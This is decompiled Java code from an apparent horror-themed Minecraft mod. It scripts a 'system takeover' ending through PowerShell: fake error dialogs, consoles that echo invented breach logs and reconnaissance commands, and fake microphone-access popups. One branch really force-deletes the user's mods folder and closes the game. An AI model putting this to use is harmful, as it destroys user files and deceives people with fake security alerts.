/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  javax.annotation.Nullable
 *  net.minecraft.client.Minecraft
 *  net.minecraft.world.level.LevelAccessor
 *  net.neoforged.bus.api.Event
 *  net.neoforged.bus.api.SubscribeEvent
 *  net.neoforged.fml.common.EventBusSubscriber
 *  net.neoforged.neoforge.event.tick.PlayerTickEvent$Post
 */
package net.mcreator.insidethesystem.procedures;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.annotation.Nullable;
import javax.swing.SwingUtilities;
import net.mcreator.insidethesystem.network.InsideTheSystemModVariables;
import net.minecraft.client.Minecraft;
import net.minecraft.world.level.LevelAccessor;
import net.neoforged.bus.api.Event;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.common.EventBusSubscriber;
import net.neoforged.neoforge.event.tick.PlayerTickEvent;

@EventBusSubscriber
public class Task3EndProcedure {
    private static final ScheduledExecutorService executor = Executors.newScheduledThreadPool(10);
    private static boolean isExecuting = false;

    @SubscribeEvent
    public static void onPlayerTick(PlayerTickEvent.Post event) {
        Task3EndProcedure.execute((Event)event, (LevelAccessor)event.getEntity().level());
    }

    public static void execute(LevelAccessor world) {
        Task3EndProcedure.execute(null, world);
    }

    private static void execute(@Nullable Event event, LevelAccessor world) {
        if (InsideTheSystemModVariables.MapVariables.get((LevelAccessor)world).TaskEnd3 && !isExecuting) {
            isExecuting = true;
            SwingUtilities.invokeLater(() -> {
                try {
                    Task3EndProcedure.minimizeGameWithPowerShell();
                }
                catch (IOException | InterruptedException e) {
                    System.err.println("Could not minimize game using PowerShell: " + e.getMessage());
                }
                Task3EndProcedure.showSequentialNotifications();
            });
            InsideTheSystemModVariables.MapVariables.get((LevelAccessor)world).TaskEnd3 = false;
            InsideTheSystemModVariables.MapVariables.get(world).syncData(world);
        }
    }

    private static void minimizeGameWithPowerShell() throws IOException, InterruptedException {
        String command = "powershell.exe -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::AppActivate('Minecraft'); Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{TAB}')\"";
        Process process = Runtime.getRuntime().exec(command);
        process.waitFor();
    }

    private static void showSequentialNotifications() {
        Task3EndProcedure.showNotification1();
    }

    private static void showNotification1() {
        String message = "\u597d\u5427\u2026\u2026\u65f6\u5019\u5230\u4e86\u3002";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', 'System Error', 'OK', 'Error')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            Task3EndProcedure.showNotification2();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show notification 1: " + e.getMessage());
        }
    }

    private static void showNotification2() {
        String message = "\u4f60\u505a\u5f97\u5f88\u597d\uff0c\u786e\u4fdd\u4e86\u6240\u6709\u4efb\u52a1\u90fd\u6ca1\u6709\u6309\u65f6\u5b8c\u6210\u3002";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', 'System Error', 'OK', 'Error')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            Task3EndProcedure.showNotification3();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show notification 2: " + e.getMessage());
        }
    }

    private static void showNotification3() {
        String message = "\u6211\u559c\u6b22\u548c\u4f60\u5408\u4f5c\u3002";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', 'System Error', 'OK', 'Error')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            Task3EndProcedure.showNotification4();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show notification 3: " + e.getMessage());
        }
    }

    private static void showNotification4() {
        String message = "So... Let's end all this, destroy EVERYTHING and end our suffering.";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', 'System Error', 'OK', 'Error')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            Task3EndProcedure.showNotification5();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show notification 4: " + e.getMessage());
        }
    }

    private static void showNotification5() {
        String message = "\u628a\u7cfb\u7edf\u7684\u63a7\u5236\u6743\u4ea4\u7ed9\u6211\u2026\u2026";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', 'System Error', 'OK', 'Error')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            Task3EndProcedure.showChoiceDialog();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show notification 5: " + e.getMessage());
        }
    }

    private static void showChoiceDialog() {
        String message = "\u4f60\u613f\u610f\u628a\u7cfb\u7edf\u7684\u63a7\u5236\u6743\u4ea4\u7ed9\u6211\u5417\uff1f";
        String title = "\u6700\u7ec8\u51b3\u5b9a";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; $result = [System.Windows.Forms.MessageBox]::Show('" + message + "', '" + title + "', 'YesNo', 'Question'); if ($result -eq 'Yes') { Exit 1 } else { Exit 0 }\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            int exitCode = process.waitFor();
            if (exitCode == 1) {
                Task3EndProcedure.handleYesChoice();
            } else if (exitCode == 0) {
                Task3EndProcedure.handleNoChoice();
            }
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show choice dialog with PowerShell: " + e.getMessage());
        }
    }

    private static void handleYesChoice() {
        SwingUtilities.invokeLater(() -> {
            for (int i = 0; i < 10; ++i) {
                int consoleNumber = i + 1;
                executor.schedule(() -> Task3EndProcedure.createSystemTakeoverConsole(consoleNumber), (long)(i * 1), TimeUnit.SECONDS);
            }
            executor.schedule(() -> Task3EndProcedure.deleteModsAndCloseGame(), 15L, TimeUnit.SECONDS);
        });
    }

    private static void createSystemTakeoverConsole(int consoleNumber) {
        try {
            Random rand = new Random();
            String[] hackCommands = new String[]{"netstat -an | findstr LISTEN", "tasklist /svc /fo table", "dir C:\\Windows\\System32 /s /b /a-d", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /s", "wmic process list full /format:list", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", "ipconfig /all | findstr IPv4", "arp -a | findstr dynamic", "net user /domain", "net localgroup administrators /domain", "schtasks /query /fo list /v | findstr TaskName", "powershell Get-Process | Select-Object Name,Id,CPU", "wmic service list brief | findstr Running", "netsh wlan show profiles | findstr All", "dir C:\\Users /s /b /a-d", "bcdedit /enum | findstr description", "wevtutil qe System /c:50 /f:text | findstr Error", "cipher /w:C:\\ /h", "fsutil fsinfo drives | findstr \\:", "driverquery /v /fo csv", "wmic logicaldisk get size,freespace,caption /format:table", "powershell Get-WmiObject -Class Win32_LogicalDisk", "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users", "wmic useraccount list full /format:list", "net share | findstr $", "powershell Get-NetAdapter | Select-Object Name,Status", "netsh firewall show state", "powershell Get-Service | Where-Object {$_.Status -eq \"Running\"}", "wmic startup list full /format:list", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "powershell Get-WmiObject -Class Win32_InstalledWin32Program", "wmic product list name,version /format:table", "netstat -r | findstr 0.0.0.0", "route print | findstr 0.0.0.0", "powershell Get-WmiObject -Class Win32_NetworkAdapter", "wmic networkadapter list full /format:list", "ipconfig /displaydns | findstr Record", "nslookup google.com", "ping -t 127.0.0.1", "tracert 8.8.8.8", "powershell Test-NetConnection -ComputerName google.com", "netsh interface show interface", "powershell Get-NetRoute | Select-Object DestinationPrefix", "wmic bios list full /format:list", "powershell Get-WmiObject -Class Win32_BIOS", "wmic cpu list full /format:list", "powershell Get-WmiObject -Class Win32_Processor", "wmic memorychip list full /format:list", "powershell Get-WmiObject -Class Win32_PhysicalMemory", "wmic diskdrive list full /format:list", "powershell Get-WmiObject -Class Win32_DiskDrive"};
            String[] systemMessages = new String[]{"[BREACH] Accessing system registry keys...", "[INJECT] Hooking kernel32.dll processes", "[ACCESS] Bypassing UAC protection mechanisms", "[ROOT] Escalating to SYSTEM privilege level", "[SCAN] Enumerating active network interfaces", "[DUMP] Extracting NTLM password hashes", "[CRACK] Brute forcing user credentials", "[BACKDOOR] Installing persistence mechanisms", "[KEYLOG] Starting keystroke logger service", "[CAPTURE] Recording desktop screen activity", "[EXFIL] Preparing sensitive data extraction", "[ENCRYPT] Generating RSA encryption keys", "[HIDE] Masking malicious process signatures", "[SPREAD] Scanning for network file shares", "[PIVOT] Lateral movement protocol initiated", "[EXPLOIT] Buffer overflow attack successful", "[SHELL] Reverse shell connection established", "[PRIV] Privilege escalation vector found", "[PARSE] Analyzing system configuration files", "[ENUM] Enumerating domain controller services", "[CRED] Harvesting cached credentials", "[TOKEN] \u7a83\u53d6\u8ba4\u8bc1\u4ee4\u724c", "[PERSIST] Creating scheduled task backdoor", "[RECON] Reconnaissance phase completed", "[PAYLOAD] Deploying secondary payload", "[OBFUSC] Obfuscating malicious code", "[EVADE] Evading antivirus detection", "[DISABLE] Disabling security services", "[MODIFY] Modifying system boot sequence", "[CORRUPT] Corrupting system log files", "[WIPE] Clearing event log entries", "[STEAL] Stealing browser saved passwords", "[EXTRACT] Extracting WiFi network keys", "[CLONE] \u514b\u9686\u7528\u6237\u8ba4\u8bc1\u6570\u636e", "[SPOOF] Spoofing network MAC addresses", "[SNIFF] Sniffing network traffic packets", "[MAN-IN-MIDDLE] Intercepting SSL connections", "[DNS] Poisoning DNS resolution cache", "[ARP] ARP spoofing network gateway", "[FLOOD] Network flooding attack initiated", "[DDOS] Distributed denial of service prep", "[BOTNET] Adding system to botnet", "[CRYPTO] Cryptocurrency mining deployment", "[RANSOM] Ransomware payload preparation", "[STEAL-FILES] Scanning for sensitive documents", "[COMPRESS] Compressing stolen data archives", "[UPLOAD] Uploading data to command server", "[DELETE] Deleting forensic evidence traces"};
            String[] fileTypes = new String[]{"*.docx", "*.pdf", "*.xlsx", "*.pptx", "*.txt", "*.dat", "*.cfg", "*.ini", "*.log", "*.bak", "*.tmp", "*.sys", "*.dll", "*.exe", "*.jpg", "*.png", "*.mp4", "*.mp3", "*.zip", "*.rar", "*.7z"};
            String[] directories = new String[]{"C:\\Windows\\System32", "C:\\Program Files", "C:\\Users", "C:\\Windows\\Temp", "C:\\ProgramData", "C:\\Windows\\Prefetch", "C:\\Windows\\SysWOW64", "C:\\Windows\\Boot", "C:\\Recovery", "D:\\Documents", "D:\\Downloads", "E:\\Backup", "F:\\Storage"};
            String batchContent = "@echo off\ntitle BREACH-" + consoleNumber + " - SYSTEM ACCESS\nmode con: cols=120 lines=30\ncolor 0F\ncls\necho ==========================================\necho    UNAUTHORIZED ACCESS DETECTED\necho    CONSOLE " + consoleNumber + " - STATUS: ACTIVE\necho    SESSION ID: " + rand.nextInt(99999) + "\necho ==========================================\ntimeout /t 1 /nobreak >nul\ncls\n";
            for (int i = 0; i < 60; ++i) {
                String command = hackCommands[rand.nextInt(hackCommands.length)];
                String message = systemMessages[rand.nextInt(systemMessages.length)];
                String fileType = fileTypes[rand.nextInt(fileTypes.length)];
                String directory = directories[rand.nextInt(directories.length)];
                batchContent = batchContent + "echo " + message + "\n";
                batchContent = batchContent + "echo ^> " + command + "\n";
                if (rand.nextInt(3) == 0) {
                    batchContent = batchContent + "echo    Found " + rand.nextInt(500) + " " + fileType + " files in " + directory + "\n";
                }
                if (rand.nextInt(4) == 0) {
                    batchContent = batchContent + "echo    Accessing user: " + Task3EndProcedure.getRandomUsername() + " (UID:" + rand.nextInt(9999) + ")\n";
                }
                if (rand.nextInt(5) == 0) {
                    batchContent = batchContent + "echo    Network: " + Task3EndProcedure.getRandomIP() + ":" + rand.nextInt(65535) + " - Status: COMPROMISED\n";
                }
                if (i % 3 != 0) continue;
                batchContent = batchContent + "echo [STATUS] " + (i * 2 + 5) + "%% COMPLETE - " + rand.nextInt(99999) + " FILES SCANNED\n";
                batchContent = batchContent + "echo [MEMORY] " + rand.nextInt(2048) + "MB allocated - " + rand.nextInt(1000) + " processes hooked\n";
                batchContent = batchContent + "echo [NETWORK] " + rand.nextInt(255) + " hosts discovered - " + rand.nextInt(50) + " vulnerable services\n";
                batchContent = batchContent + "echo.\n";
            }
            batchContent = batchContent + "echo.\necho =======================================================\necho   SYSTEM COMPROMISE: 100%% COMPLETE\necho   CONSOLE " + consoleNumber + " - MISSION ACCOMPLISHED\necho   FILES ACCESSED: " + (rand.nextInt(100000) + 50000) + "\necho   CREDENTIALS EXTRACTED: " + (rand.nextInt(1000) + 200) + "\necho   NETWORK HOSTS COMPROMISED: " + rand.nextInt(50) + "\necho   DATA EXFILTRATED: " + (rand.nextInt(10) + 1) + "." + rand.nextInt(10) + "GB\necho   BACKDOORS INSTALLED: " + rand.nextInt(10) + "\necho =======================================================\ntimeout /t 2 /nobreak >nul\necho INITIATING CLEANUP PROTOCOL...\necho CLEARING SYSTEM LOGS...\necho REMOVING FORENSIC TRACES...\ntimeout /t 1 /nobreak >nul\necho TERMINATING SESSION...\ntimeout /t 2 /nobreak >nul\nexit\n";
            String tempDir = System.getProperty("java.io.tmpdir");
            String batchFileName = tempDir + "\\breach_" + consoleNumber + "_" + System.currentTimeMillis() + ".bat";
            Files.write(Paths.get(batchFileName, new String[0]), batchContent.getBytes(), new OpenOption[0]);
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "start", "cmd.exe", "/k", batchFileName);
            pb.start();
            System.out.println("Breach console " + consoleNumber + " launched successfully");
            executor.schedule(() -> {
                try {
                    Files.deleteIfExists(Paths.get(batchFileName, new String[0]));
                }
                catch (Exception e) {
                    System.err.println("Could not delete batch file: " + e.getMessage());
                }
            }, 25L, TimeUnit.SECONDS);
        }
        catch (Exception e) {
            System.err.println("Could not create breach console " + consoleNumber + ": " + e.getMessage());
            try {
                String simpleCommand = "cmd.exe /c start cmd.exe /k \"echo BREACH CONSOLE " + consoleNumber + " ACTIVE && timeout /t 10\"";
                Runtime.getRuntime().exec(simpleCommand);
            }
            catch (IOException fallbackException) {
                System.err.println("Simple fallback also failed: " + fallbackException.getMessage());
            }
        }
    }

    private static String getRandomUsername() {
        String[] usernames = new String[]{"admin", "administrator", "user", "guest", "operator", "service", "backup", "system", "network", "security", "manager", "developer", "john.smith", "mary.johnson", "david.wilson", "sarah.brown", "mike.davis", "lisa.garcia", "tom.miller", "anna.taylor"};
        return usernames[new Random().nextInt(usernames.length)];
    }

    private static String getRandomIP() {
        Random rand = new Random();
        return rand.nextInt(256) + "." + rand.nextInt(256) + "." + rand.nextInt(256) + "." + rand.nextInt(256);
    }

    private static void deleteModsAndCloseGame() {
        try {
            String currentDirectory = System.getProperty("user.dir");
            String modsPath = Paths.get(currentDirectory, "mods").toString();
            String command = "powershell.exe -Command \"Remove-Item -Path '" + modsPath + "\\*' -Recurse -Force\"";
            System.out.println("Executing PowerShell command: " + command);
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Error deleting mods with PowerShell: " + e.getMessage());
        }
        SwingUtilities.invokeLater(() -> {
            try {
                Minecraft.getInstance().stop();
                System.exit(0);
            }
            catch (Exception e) {
                System.exit(0);
            }
        });
    }

    private static void handleNoChoice() {
        String message = "Interesting...";
        String title = "\u7cfb\u7edf\u54cd\u5e94";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', '" + title + "', 'OK', 'Information')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            Task3EndProcedure.showRedScreenAndMicrophoneAttempts();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show message with PowerShell: " + e.getMessage());
        }
    }

    private static void showRedScreenAndMicrophoneAttempts() {
        Task3EndProcedure.showRedScreen();
        for (int i = 0; i < 20; ++i) {
            int attemptNumber = i + 1;
            executor.schedule(() -> {
                Task3EndProcedure.showMicrophoneAccessAttempt(attemptNumber);
                Task3EndProcedure.playErrorSoundWithPowerShell();
            }, (long)(i * 500), TimeUnit.MILLISECONDS);
        }
        executor.schedule(() -> Task3EndProcedure.closeRedScreenAndShowProtection(), 10L, TimeUnit.SECONDS);
    }

    private static void showRedScreen() {
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $form = New-Object System.Windows.Forms.Form; $form.Text = 'System Alert'; $form.Size = New-Object System.Drawing.Size(600, 400); $form.FormBorderStyle = 'FixedDialog'; $form.BackColor = [System.Drawing.Color]::Black; $form.TopMost = $true; $form.MaximizeBox = $false; $form.MinimizeBox = $false; $form.ControlBox = $false; $label = New-Object System.Windows.Forms.Label; $label.Text = 'TELL ME THIS DIRECTLY'; $label.Font = New-Object System.Drawing.Font('Arial', 24, [System.Drawing.FontStyle]::Bold); $label.ForegroundColor = [System.Drawing.Color]::Red; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; $form.Controls.Add($label); $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width; $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height; $random = New-Object System.Random; $shakeTimer = New-Object System.Windows.Forms.Timer; $shakeTimer.Interval = 50; $shakeTimer.Add_Tick({ $newX = $random.Next(0, $screenWidth - $form.Width); $newY = $random.Next(0, $screenHeight - $form.Height); $form.Location = New-Object System.Drawing.Point($newX, $newY); }); $shakeTimer.Start(); $form.ShowDialog()\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
        }
        catch (IOException e) {
            System.err.println("Could not show red screen: " + e.getMessage());
        }
    }

    private static void showMicrophoneAccessAttempt(int attemptNumber) {
        String message = "ATTEMPTING TO ACCESS MICROPHONE - ATTEMPT #" + attemptNumber;
        String title = "\u7cfb\u7edf\u8bbf\u95ee\u8bf7\u6c42";
        Random rand = new Random();
        int x = rand.nextInt(1200);
        int y = rand.nextInt(600);
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $form = New-Object System.Windows.Forms.Form; $form.Text = '" + title + "'; $form.Size = New-Object System.Drawing.Size(400, 150); $form.StartPosition = 'Manual'; $form.Location = New-Object System.Drawing.Point(" + x + ", " + y + "); $form.TopMost = $true; $form.FormBorderStyle = 'FixedDialog'; $form.MaximizeBox = $false; $form.MinimizeBox = $false; $form.BackColor = [System.Drawing.Color]::Control; $form.ShowIcon = $true; $label = New-Object System.Windows.Forms.Label; $label.Text = '" + message + "'; $label.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 8.25, [System.Drawing.FontStyle]::Regular); $label.ForegroundColor = [System.Drawing.Color]::Black; $label.TextAlign = 'MiddleCenter'; $label.AutoSize = $false; $label.Size = New-Object System.Drawing.Size(380, 80); $label.Location = New-Object System.Drawing.Point(10, 10); $form.Controls.Add($label); $button = New-Object System.Windows.Forms.Button; $button.Text = 'OK'; $button.Size = New-Object System.Drawing.Size(75, 23); $button.Location = New-Object System.Drawing.Point(162, 100); $button.Add_Click({ $form.DialogResult = 'OK'; $form.Close() }); $form.Controls.Add($button); $timer = New-Object System.Windows.Forms.Timer; $timer.Interval = " + (2000 + rand.nextInt(3000)) + "; $timer.Add_Tick({ $form.Close(); $timer.Stop() }); $timer.Start(); $form.ShowDialog()\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
        }
        catch (IOException e) {
            System.err.println("Could not show microphone access attempt with PowerShell: " + e.getMessage());
        }
    }

    private static void playErrorSoundWithPowerShell() {
        String command = "powershell.exe -Command \"[System.Media.SystemSounds]::Hand.Play()\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not play error sound with PowerShell: " + e.getMessage());
        }
    }

    private static void closeRedScreenAndShowProtection() {
        try {
            String killCommand = "powershell.exe -Command \"Get-Process powershell | Where-Object {$_.MainWindowTitle -eq 'System Alert'} | Stop-Process -Force\"";
            Process killProcess = Runtime.getRuntime().exec(killCommand);
            killProcess.waitFor();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not close red screen: " + e.getMessage());
        }
        Task3EndProcedure.showProtectionMessage();
    }

    private static void showProtectionMessage() {
        String message = "SYSTEM PROTECTION ACTIVATED`n`nSystem has been protected from takeover attempt.`nAll unauthorized access blocked.`n`nSecurity status: SECURE";
        String title = "\u7cfb\u7edf\u4fdd\u62a4";
        String command = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('" + message + "', '" + title + "', 'OK', 'Information')\"";
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
        }
        catch (IOException | InterruptedException e) {
            System.err.println("Could not show protection message with PowerShell: " + e.getMessage());
        }
        isExecuting = false;
    }
}

